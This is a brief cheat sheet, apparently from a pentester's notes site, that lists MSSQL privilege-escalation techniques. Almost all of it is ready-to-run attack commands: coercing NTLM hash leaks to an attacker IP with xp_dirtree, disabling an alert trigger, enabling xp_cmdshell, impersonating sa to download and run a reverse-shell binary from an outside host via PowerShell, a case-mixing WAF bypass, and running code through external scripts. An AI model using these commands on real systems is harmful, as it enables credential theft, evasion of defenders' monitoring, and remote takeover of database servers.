---
title: "MSSQL Privilege Escalation"
date: 2024-6-27
tags: ["mssql", "database", "Windows", "exploit", "rce", "privesc", "pe"]
---

---
### Abuse #1: Steal NTLM hash

```bash
# In our local Linux machine
sudo responder -I tun0
```

```mysql
# Inside mssql terminal
xp_dirtree '\\10.10.14.10\any\thing';
```

```mysql
# Or
use master; exec xp_dirtree '\\10.10.14.10\any\thing';
```

```mysql
# Or
load_file('\\10.10.14.10\any\thing');
```

### Abuse #2: Run xp_cmdshell

```mysql
# Check any policy blocking xp_cmdshell
select name from sys.server_triggers;
```

```mysql
# Disable trigger if any
disable trigger ALERT_xp_cmdshell on all server;
```

```mysql
# Enable xp_cmdshell
enable_xp_cmdshell;
```

```mysql
# RCE
xp_cmdshell whoami
```

### Abuse #3: Impersonate sa to run xp_cmdshell

```mysql
execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
```

```mysql
execute as login = 'sa'; reconfigure;
```

```mysql
execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
```

```mysql
execute as login = 'sa'; reconfigure;
```

```mysql
execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe'
```

<small>*Note: try xp_cmDshElL to bypass WAF*</small>

### Abuse #4: Run External Script

```mysql
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
```

<br>